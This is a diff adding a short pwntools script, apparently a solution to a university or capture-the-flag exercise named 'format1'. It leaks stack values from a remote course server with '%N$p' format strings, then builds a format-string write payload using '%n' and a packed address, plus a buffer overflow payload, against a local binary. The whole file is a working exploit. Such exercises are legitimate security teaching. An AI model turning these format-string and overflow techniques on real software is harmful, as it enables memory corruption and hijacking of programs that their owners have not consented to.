@@ -1,0 +1,42 @@
+from pwn import *
+
+context.log_level = 'error'
+
+def leak(param_num):
+    c = remote('cs4401shell.walls.ninja',9898)
+    c.recvline()
+    c.recvline()
+    c.sendline(f"%{param_num}$p")
+    leak_raw = c.recvline().strip()
+    leak_value = int(leak_raw, 16)
+    c.sendline(b'_')
+    c.sendline(b'_')
+    c.wait()
+    return leak_value
+
+
+#for i in range(0,32):
+#    try:
+#        with context.silent:
+#            leak_val = leak(i)
+#        log.info(f"Value leaked at param {i}: {hex(leak_val)}")
+#    except Exception as e:
+#        log.info(f"Failed to leak value for param num {i}")
+#        print(e)
+
+
+c = process('./format1')
+
+translate = int(c.recvline().strip().decode(),0)
+language = int(c.recvline().strip().decode(),0)
+
+print(f"Translate: {hex(translate)}")
+print(f"Language: {hex(language)}")
+payload1 = b"%2989d%8$n    "+p64(language)
+payload2 = b'\x61'*47+p64(translate)
+
+open("payloado","wb").write(payload1+payload2)
+c.sendline(payload1)
+#c.sendline(payload2)
+#c.interactive()
+
